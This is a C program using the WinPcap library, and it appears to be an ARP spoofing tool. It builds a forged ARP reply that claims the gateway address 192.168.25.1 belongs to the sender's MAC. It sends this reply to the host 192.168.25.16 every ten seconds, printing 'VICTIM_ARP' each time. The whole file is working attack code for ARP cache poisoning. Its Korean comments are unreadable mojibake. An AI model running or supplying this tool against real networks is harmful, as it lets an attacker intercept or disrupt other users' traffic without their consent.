#include <WinSock2.h>
//htons(), htonl() �Լ� ���
#include <pcap.h>
//��Ʈ��ũ ���α׷��� �Լ��� ����
//WinSock2.h�� �׻� pcap.h���� ���� �־���Ѵ�
#include <stdio.h>
#include <stdint.h>
//���� �ڷ����� �����Ͽ� ����
#include <string.h>


#pragma warning(disable:4996)
#pragma warning(disable:6011)

#define ETH_LEN 6
#define IP_LEN 4

#define ETHERTYPE_ARP 0x0806


//Wireshark�� �����Ͽ� ����ü�� �����
#pragma pack(push, 1)
struct ether_header
{
	uint8_t dst_host[ETH_LEN];
	uint8_t src_host[ETH_LEN];
	uint16_t ether_type;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct arp_header {
	uint16_t hardware_type;
	uint16_t protocol_type;
	uint8_t hardware_size;
	uint8_t protocol_size;
	uint16_t opcode;
	uint8_t sender_host[ETH_LEN];
	uint8_t sender_ip[IP_LEN];
	uint8_t target_host[ETH_LEN];
	uint8_t target_ip[IP_LEN];
};
#pragma pack(pop)



int main(void)
{
	struct ether_header eth;
	struct arp_header arp;
	pcap_if_t* allDev;
	pcap_if_t* tempDev;
	char errbuf[PCAP_ERRBUF_SIZE];
	unsigned char packet[1500];
	pcap_t* _handle;


	int i = 0;
	int select;
	//��� ��Ʈ��ũ ��ġ�� �������� �Լ�
	if (pcap_findalldevs(&allDev, errbuf) == PCAP_ERROR)
	{
		printf("[ERROR] pcap_findalldevs() : %s\n", errbuf);
		return NULL;
	}

	//��ġ�� ���Ḯ��Ʈ�� ����Ǿ� �־� �ϳ��� �ҷ��� ȭ�鿡 ���
	for (tempDev = allDev; tempDev != NULL; tempDev = tempDev->next) {
		printf("%d. %s", ++i, tempDev->name);
		if (tempDev->description)
			printf(" (%s)\n", tempDev->description);
		else printf("No description available\n");
	}
	//��ġ ������ �ӽ� ��ġ�� ����Ű�� tempDev ������ �̵�

	printf("select interface number (1-%d) : ", i);
	scanf_s("%d", &select);
	if (select<1 || select>i) {
		printf("\nInterface number out of range.\n");
		pcap_freealldevs(allDev);
		return -1;
	}
	for (tempDev = allDev, i = 0; i < select - 1; tempDev = tempDev->next, i++);
	//���õ� ��ġ�� �ڵ��� �������� �Լ�, �ڵ��� �������� ��� ��ġ�� ��Ȱ��ȭ ���ش�.

	if ((_handle = pcap_open_live(tempDev->name, 65536, 0, 1000, errbuf)) == NULL) {
		printf("  ");
		return -1;
	}
	/*	pcap_t* _handle = pcap_open(tempDev->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf);
	if (_handle == NULL) {
	printf("[ERROR] pcap_open() : %s\n", errbuf);
	return NULL;
	}
	pcap_freealldevs(allDev);
	return _handle;*/

	//��Ŷ ���� �ʱ�ȭ
	memset(packet, 0, sizeof(packet));
	int length = 0;

	//Ethernet Header ����
	//������
	eth.dst_host[0] = 0x00;
	eth.dst_host[1] = 0x0c;
	eth.dst_host[2] = 0x29;
	eth.dst_host[3] = 0x18;
	eth.dst_host[4] = 0x38;
	eth.dst_host[5] = 0x4b;
	//�۽���
	eth.src_host[0] = 0x00;
	eth.src_host[1] = 0xe0;
	eth.src_host[2] = 0x4c;
	eth.src_host[3] = 0x61;
	eth.src_host[4] = 0xc8;
	eth.src_host[5] = 0x1f;

	eth.ether_type = htons(ETHERTYPE_ARP); //3������ �������� ����

										   //��Ŷ ���ۿ� ����
	memcpy(packet, &eth, sizeof(eth));
	length += sizeof(eth);

	//arp ��� ����
	arp.hardware_type = htons(0x0001);
	arp.protocol_type = htons(0x0800);
	arp.hardware_size = 0x06;
	arp.protocol_size = 0x04;
	arp.opcode = htons(0x0002);

	//������ MAC
	arp.sender_host[0] = 0x00;
	arp.sender_host[1] = 0xe0;
	arp.sender_host[2] = 0x4c;
	arp.sender_host[3] = 0x61;
	arp.sender_host[4] = 0xc8;
	arp.sender_host[5] = 0x1f;

	//������ IP(����Ʈ���� IP)
	arp.sender_ip[0] = 192;
	arp.sender_ip[1] = 168;
	arp.sender_ip[2] = 25;
	arp.sender_ip[3] = 1;


	//������ MAC
	arp.target_host[0] = 0x00;
	arp.target_host[1] = 0x0c;
	arp.target_host[2] = 0x29;
	arp.target_host[3] = 0x18;
	arp.target_host[4] = 0x38;
	arp.target_host[5] = 0x4b;

	//������ IP
	arp.target_ip[0] = 192;
	arp.target_ip[1] = 168;
	arp.target_ip[2] = 25;
	arp.target_ip[3] = 16;

	//arp ���� ��Ŷ ���ۿ� �������ֱ�
	memcpy(packet + length, &arp, sizeof(arp));
	length += sizeof(arp);

	if (length < 64) {
		for (i = length; i < 64; i++) {
			packet[i] = 0;
		}
	}
	if (_handle == NULL) {
		printf("[ERROR] get_pcap_handle()\n");
		return -1;
	}

	//��Ŷ �����ϴ� �κ�
	//make_arp_reply(packet, &length);

	while (1)
	{
		if (pcap_sendpacket(_handle, packet, length) != 0)
		{
			printf("SEND PACKET ERROR!\n");
		
		}
		printf("VICTIM_ARP\n");
		Sleep(10000);
	}
	return 0;
}
